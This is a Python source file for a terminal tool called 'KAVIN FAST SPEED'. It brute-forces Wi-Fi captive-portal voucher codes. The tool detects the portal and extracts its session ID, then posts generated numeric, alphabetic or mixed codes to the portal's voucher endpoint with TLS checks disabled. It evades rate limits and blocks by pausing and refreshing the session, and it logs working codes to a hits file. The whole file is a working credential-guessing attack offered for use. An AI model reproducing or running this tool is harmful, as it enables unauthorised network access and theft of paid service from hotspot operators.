# lakaw.py (KAVIN FAST SPEED - Fast Auto-Heal Edition)
import os
import time
import json
import random
import string
import sqlite3
import re
import html
import requests
import urllib3
import sys
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.live import Live
from rich.table import Table
from rich.align import Align
from rich.text import Text
from rich.box import DOUBLE, HEAVY, ROUNDED, MINIMAL
import license as _license

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DB_FILE = "lakaw_data.db"
STATE_FILE = "lakaw_state.json"
HITS_FILE = "hits.txt"

# ⚡ Speed & Anti-Ban Optimization (မြန်မြန် + IP မခံရအောင်)
BASE_SLEEP_MIN = 0.01
BASE_SLEEP_MAX = 0.03
RATE_LIMIT_SLEEP = 45
NETWORK_RETRY_SLEEP = 0.5
SESSION_REFRESH_SLEEP = 1.0

console = Console()
session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36"})
adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=3)
session.mount('http://', adapter)
session.mount('https://', adapter)

def clear_screen():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        pass

def format_time(seconds):
    try:
        seconds = int(seconds)
        h = seconds // 3600
        m = (seconds % 3600) // 60
        s = seconds % 60
        return f"{h:02d}:{m:02d}:{s:02d}"
    except Exception:
        return "00:00:00"

def normalize_hits(hits):
    if not hits: return []
    result = []
    for h in hits:
        if isinstance(h, dict):
            result.append({"code": h.get("code", ""), "time": h.get("time", "--:--:--")})
        elif isinstance(h, str):
            result.append({"code": h, "time": "--:--:--"})
    return result

def hits_codes_only(hits):
    return [h.get("code") if isinstance(h, dict) else h for h in hits]

def init_db():
    try:
        conn = sqlite3.connect(DB_FILE, timeout=10)
        conn.execute('CREATE TABLE IF NOT EXISTS tried_codes (code TEXT PRIMARY KEY)')
        conn.commit()
        return conn
    except Exception: return None

def is_tried(conn, code):
    if conn is None: return False
    try: return conn.execute("SELECT 1 FROM tried_codes WHERE code=?", (code,)).fetchone() is not None
    except Exception: return False

def mark_tried(conn, code):
    if conn is None: return
    try:
        conn.execute("INSERT OR IGNORE INTO tried_codes (code) VALUES (?)", (code,))
        conn.commit()
    except Exception: pass

def load_state():
    try:
        with open(STATE_FILE) as f: return json.load(f)
    except Exception: return None

def save_state(mode, tested, hits, custom_url="", scan_method="random"):
    try:
        with open(STATE_FILE, "w") as f: json.dump({"mode": mode, "tested": tested, "hits": hits, "custom_url": custom_url, "scan_method": scan_method}, f)
    except Exception: pass

def clear_state():
    try: os.remove(STATE_FILE)
    except Exception: pass

def extract_session(value):
    if not value: return None
    try: value = html.unescape(value)
    except Exception: pass
    try:
        q = parse_qs(urlparse(value).query)
        for k, v in q.items():
            if k.lower() == "sessionid" and v: return v[0]
    except Exception: pass
    try:
        m = re.search(r"sessionId=([a-zA-Z0-9]+)", value, re.IGNORECASE)
        return m.group(1) if m else None
    except Exception: return None

def fetch_session(custom_url=""):
    if custom_url:
        try:
            r = session.get(custom_url, timeout=3, allow_redirects=True, verify=False)
            p = urlparse(r.url)
            portal_base = f"{p.scheme}://{p.netloc}"
            sid = extract_session(r.url) or extract_session(r.text)
            if sid: return portal_base, sid
            return portal_base, "auto_session"
        except Exception: pass

    probes = [
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://captive.apple.com/hotspot-detect.html",
    ]
    for url in probes:
        try:
            r = session.get(url, timeout=2, allow_redirects=True, verify=False)
        except Exception:
            continue
        try:
            p = urlparse(r.url)
            if "gstatic.com" in p.netloc or "apple.com" in p.netloc:
                continue
            portal_base = f"{p.scheme}://{p.netloc}"
            cands = [r.url, r.text]
            cands.extend(h.headers.get("Location", "") for h in r.history)
            cands.extend(h.url for h in r.history)
            for c in cands:
                sid = extract_session(c)
                if sid: return portal_base, sid
            try:
                m = re.search(r"(?:self|window)\.location\.href\s*=\s*['\"]([^'\"]+)['\"]", r.text)
                if m:
                    nxt = urljoin(r.url, m.group(1))
                    r2 = session.get(nxt, timeout=2, allow_redirects=True, verify=False)
                    sid = extract_session(r2.url) or extract_session(r2.text)
                    if sid: return portal_base, sid
            except Exception: pass
        except Exception: continue
    return None, None

def test_code(portal_base, session_id, code):
    url = f"{portal_base}/api/auth/voucher/?lang=en_US"
    headers = {"Content-Type": "application/json", "Origin": portal_base}
    payload = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": "ABCD"}
    try:
        r = session.post(url, json=payload, headers=headers, timeout=1.5, verify=False)
        return r.text if r.text else "__NETWORK_ERROR__"
    except Exception: return "__NETWORK_ERROR__"

def gen_code(mode, length):
    try:
        if mode == "num": return str(random.randint(0, 10**length - 1)).zfill(length)
        elif mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=length))
        elif mode == "mix": return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    except Exception: pass
    return ""

def make_layout(mode_name, current_code, tested, elapsed, status, hits, running_logs, speed):
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=4),
        Layout(name="stats", size=5),
        Layout(name="logs_hits", ratio=1),
    )

    header_text = Text("⚡ KAVIN FAST SPEED ⚡", style="bold bright_white on dark_blue", justify="center")
    layout["header"].update(Panel(Align.center(header_text), border_style="bright_blue", box=DOUBLE))

    status_color = "bright_green" if status == "Active" else ("bright_red" if status == "Limit" else "bright_yellow")
    stats_text = Text.assemble(
        ("  🎯 CODE  : ", "bright_white"), (f"{current_code}\n", "bold bright_cyan"),
        ("  📊 TRIED : ", "bright_white"), (f"{tested:,}  ", "bold bright_yellow"),
        ("  ⚡ SPEED : ", "bright_white"), (f"{speed:.1f} /m\n", "bold bright_magenta"),
        ("  ⏱ TIME  : ", "bright_white"), (f"{elapsed}  ", "bold bright_blue"),
        ("  📡 STATUS: ", "bright_white"), (f"{status}\n", f"bold {status_color}"),
    )
    layout["stats"].update(Panel(Align.center(stats_text), border_style="cyan", box=HEAVY))

    lower_layout = Layout()
    lower_layout.split_row(Layout(name="logs", ratio=1), Layout(name="hits", ratio=1))

    log_text = Text()
    for lg in running_logs[-6:]:
        log_text.append(Text.from_markup(lg))
        log_text.append("\n")
    if not running_logs: log_text.append("[dim]Waiting...[/dim]")
    lower_layout["logs"].update(Panel(log_text, title="[bold]📡 Logs[/bold]", border_style="bright_green", box=ROUNDED))

    hits_text = Text()
    last_hits = hits[-5:]
    for i, h in enumerate(last_hits, 1):
        c = h.get("code", "") if isinstance(h, dict) else h
        hits_text.append(f"{i}. {c}\n", style="bold bright_yellow")
    if not last_hits: hits_text.append("[dim]Searching...[/dim]")
    lower_layout["hits"].update(Panel(hits_text, title="[bold]🏆 Hits[/bold]", border_style="bright_magenta", box=ROUNDED))

    layout["logs_hits"].update(lower_layout)
    return layout

def scan_loop(mode, length, custom_url="", scan_method="random", start_tested=0, start_hits=None):
    mode_str = f"{mode}_{length}"
    hits = normalize_hits(start_hits) if start_hits else []
    running_logs, tested = [], start_tested
    start_time, portal_base, session_id, net_error_streak = time.time(), None, None, 0
    conn = init_db()
    live, live_cm = None, None

    try:
        initial = make_layout(mode_str, "------", tested, "00:00:00", "--", hits, running_logs, 0.0)
        live_cm = Live(initial, refresh_per_second=4, screen=True)
        live = live_cm.__enter__()
    except Exception: pass

    def _update(code, status, current_speed):
        if live is None: return
        try: live.update(make_layout(mode_str, code, tested, format_time(time.time() - start_time), status, hits, running_logs, current_speed))
        except Exception: pass

    def push_log(msg): running_logs.append(f"[dim]{time.strftime('%H:%M:%S')}[/dim] {msg}")

    last_time, speed_counter, current_speed = time.time(), 0, 0.0

    try:
        push_log("[bold bright_cyan]System Online. Fast Engine Started...[/bold bright_cyan]")
        while True:
            try:
                if not session_id or not portal_base:
                    _update("------", "--", current_speed)
                    portal_base, session_id = fetch_session(custom_url)
                    if not session_id:
                        time.sleep(SESSION_REFRESH_SLEEP)
                        portal_base = custom_url or "http://portal.local"
                        session_id = "auto_session"
                    net_error_streak = 0

                code = gen_code(mode, length)
                if not code or is_tried(conn, code): continue

                mark_tried(conn, code)
                tested += 1
                save_state(mode_str, tested, hits, custom_url, scan_method)

                speed_counter += 1
                now = time.time()
                if now - last_time >= 1.0:
                    current_speed = (speed_counter / (now - last_time)) * 60
                    speed_counter, last_time = 0, now

                push_log(f"Testing: [yellow]{code}[/yellow]")
                _update(code, "Active", current_speed)

                res = test_code(portal_base, session_id, code)
                low = (res or "").lower()

                if res == "__NETWORK_ERROR__" or res == "":
                    net_error_streak += 1
                    time.sleep(NETWORK_RETRY_SLEEP)
                    if net_error_streak >= 5:
                        push_log(f"[bold red]⚠️ Network Issues! Reconnecting...[/bold red]")
                        session_id = None
                        net_error_streak = 0
                    continue

                net_error_streak = 0

                if ("request limited" in low or "blocked" in low or "too many" in low or '"limit"' in low or "forbidden" in low):
                    _update(code, "Limit", current_speed)
                    push_log(f"[bold red]🛡️ Block Detected! Changing Session...[/bold red]")
                    time.sleep(RATE_LIMIT_SLEEP)
                    session_id = None
                    continue

                if ("session timed out" in low or "session timeout" in low or '"session":null' in low):
                    session_id = None
                    continue

                if '"success":true' in low or '"authresult":"1"' in low:
                    existing = hits_codes_only(hits)
                    if code not in existing:
                        now_str = time.strftime("%H:%M:%S")
                        hits.append({"code": code, "time": now_str})
                        push_log(f"[bold bright_green]✨ VOUCHER FOUND: {code}[/bold bright_green]")
                        try:
                            with open(HITS_FILE, "a", encoding="utf-8") as f: f.write(f"[{now_str}] CODE: {code}\n")
                        except Exception: pass
                        save_state(mode_str, tested, hits, custom_url, scan_method)
                    _update(code, "Active", current_speed)
                    time.sleep(BASE_SLEEP_MIN)
                    continue

                time.sleep(BASE_SLEEP_MIN + random.uniform(0, BASE_SLEEP_MAX))

            except KeyboardInterrupt: raise
            except Exception:
                time.sleep(NETWORK_RETRY_SLEEP)
                continue
    finally:
        if live_cm is not None:
            try: live_cm.__exit__(None, None, None)
            except Exception: pass
def show_banner():
    clear_screen()
    try:
        banner = Text()
        banner.append("🔥 KAVIN FAST SPEED 🔥\n", style="bold bright_cyan")
        banner.append("💬 BOT CONTROLLER & VOUCHER HUNTER", style="bold bright_yellow")
        console.print(Panel(Align.center(banner), border_style="cyan", box=HEAVY))
        console.print()
    except Exception: pass

def ask_mode():
    while True:
        show_banner()
        try:
            menu = Text()
            menu.append("  [1] 🔢  NUMERIC COMMAND\n", style="bold bright_white")
            menu.append("  [2] 🔤  ALPHABET COMMAND\n", style="bold bright_white")
            menu.append("  [3] 🔀  HYBRID MIX COMMAND\n", style="bold bright_white")
            menu.append("  [0] ❌  SHUTDOWN BOT\n", style="bold bright_red")
            console.print(Panel(menu, title="[bold bright_yellow] SELECT BOT COMMAND [/bold bright_yellow]", border_style="bright_yellow", box=DOUBLE))
            choice = input("➜ Select Option: ").strip()
        except KeyboardInterrupt: raise
        except Exception: return None

        if choice == "0": return None
        if choice not in ("1", "2", "3"):
            try:
                console.print("[bold bright_red]❌ Invalid Command! Select 1, 2, 3 or 0.[/bold bright_red]")
                time.sleep(1)
            except Exception: pass
            continue
        return {"1": "num", "2": "eng", "3": "mix"}[choice]

def ask_length(mode):
    while True:
        clear_screen()
        try:
            console.print(Panel(Align.center(Text(f"🎯 ACTIVE COMMAND: /start_{mode}", style="bold bright_white on dark_blue")), border_style="blue", box=HEAVY))
            console.print()
            menu = Text()
            for i in range(6, 10):
                menu.append(f"  [{i}] ⚡  {i} CHARACTERS LENGTH\n", style="bold bright_white")
            menu.append("  [0] ⬅  BACK TO MENU\n", style="bold bright_red")
            console.print(Panel(menu, title="[bold bright_yellow] SELECT KEY LENGTH [/bold bright_yellow]", border_style="bright_yellow", box=DOUBLE))
            length = input("➜ Select Length: ").strip()
        except KeyboardInterrupt: raise
        except Exception: return None

        if length == "0": return None
        if length not in ("6", "7", "8", "9"):
            try:
                console.print("[bold bright_red]❌ Invalid Length! Choose 6 to 9.[/bold bright_red]")
                time.sleep(1)
            except Exception: pass
            continue
        return int(length)

def ask_scan_method():
    while True:
        clear_screen()
        try:
            console.print(Panel(Align.center(Text("🎯 SELECT SCAN METHOD", style="bold bright_white on dark_blue")), border_style="blue", box=HEAVY))
            console.print()
            menu = Text()
            menu.append("  [1] 🎲  RANDOM (ကျပန်း)\n", style="bold bright_white")
            menu.append("  [2] 📈  SEQUENTIAL (အစဉ်လိုက်)\n", style="bold bright_white")
            menu.append("  [0] ⬅  BACK TO MENU\n", style="bold bright_red")
            console.print(Panel(menu, title="[bold bright_yellow] SELECT SCAN METHOD [/bold bright_yellow]", border_style="bright_yellow", box=DOUBLE))
            choice = input("➜ Select Method: ").strip()
        except KeyboardInterrupt: raise
        except Exception: return "random"

        if choice == "0": return None
        if choice not in ("1", "2"):
            try:
                console.print("[bold bright_red]❌ Invalid! Choose 1 or 2.[/bold bright_red]")
                time.sleep(1)
            except Exception: pass
            continue
        return {"1": "random", "2": "sequential"}[choice]

def ask_url_method():
    while True:
        clear_screen()
        try:
            console.print(Panel(Align.center(Text("🌐 URL METHOD", style="bold bright_white on dark_blue")), border_style="blue", box=HEAVY))
            console.print()
            menu = Text()
            menu.append("  [1] 📝  MANUAL (IP ကိုယ်တိုင်ထည့်)\n", style="bold bright_white")
            menu.append("  [2] 🔄  AUTO (အလိုအလျောက်ရှာ)\n", style="bold bright_white")
            menu.append("  [0] ⬅  BACK TO MENU\n", style="bold bright_red")
            console.print(Panel(menu, title="[bold bright_yellow] SELECT URL METHOD [/bold bright_yellow]", border_style="bright_yellow", box=DOUBLE))
            choice = input("➜ Select Method: ").strip()
        except KeyboardInterrupt: raise
        except Exception: return ("", "")

        if choice == "0": return None
        if choice == "1":
            custom_url = input("➜ IP / URL: ").strip()
            return (custom_url, "manual")
        if choice == "2":
            return ("", "auto")
        
        try:
            console.print("[bold bright_red]❌ Invalid! Choose 1 or 2.[/bold bright_red]")
            time.sleep(1)
        except Exception: pass
        continue

def run():
    state = load_state()
    if state:
        try:
            m, l = state["mode"].split("_")
            tested = state.get("tested", 0)
            hits = normalize_hits(state.get("hits", []))
            custom_url = state.get("custom_url", "")
            scan_method = state.get("scan_method", "random")

            clear_screen()
            console.print(Panel(Align.center(Text("💾 RESTORING BOT SESSION", style="bold bright_white on dark_red")), border_style="red", box=DOUBLE))
            console.print()

            info = Text()
            info.append("  🎯 Mode       : ", style="cyan")
            info.append(f"{m.upper()} {l}\n", style="bold white")
            info.append("  🧭 Method     : ", style="cyan")
            info.append(f"{scan_method.upper()}\n", style="bold white")
            info.append("  🌐 URL        : ", style="cyan")
            info.append(f"{custom_url or 'Auto'}\n", style="bold white")
            info.append("  📊 Tested     : ", style="cyan")
            info.append(f"{tested:,}\n", style="bold white")
            info.append("  🎁 Hits       : ", style="cyan")
            info.append(f"{len(hits)}\n", style="bold green")
            console.print(Panel(info, title="Bot Session State", border_style="green", box=ROUNDED))
            console.print()

            ans = input("➜ Resume previous bot session? (y/n): ").strip().lower()

            if ans in ("", "y", "yes"):
                scan_loop(m, int(l), custom_url, scan_method, start_tested=tested, start_hits=hits)
                return
            else: clear_state()
        except KeyboardInterrupt: raise
        except Exception: clear_state()

    while True:
        mode = ask_mode()
        if mode is None: return

        length = ask_length(mode)
        if length is None: continue

        method = ask_scan_method()
        if method is None: continue

        url_choice = ask_url_method()
        if url_choice is None: continue
        custom_url, url_mode = url_choice

        scan_loop(mode, length, custom_url, method)
        return

def main():
    if not _license.check_approval(): return
    try: run()
    except KeyboardInterrupt: pass
    except BaseException: pass
    finally:
        try: clear_screen()
        except BaseException: pass
        try:
            bye = Text()
            bye.append("\n\n")
            bye.append("🔥 KAVIN FAST SPEED 🔥\n", style="bold bright_cyan")
            bye.append("🙏 ကျေးဇူးတင်ပါတယ်ဗျ။ Bot stopped safely. ✨", style="bold bright_yellow")
            bye.append("\n\n")
            console.print(Align.center(bye))
            time.sleep(2)
        except BaseException:
            try: print("\n\n🔥 KAVIN FAST SPEED 🔥\n🙏 ကျေးဇူးတင်ပါတယ်ဗျ။")
            except BaseException: pass

if __name__ == "__main__":
    main()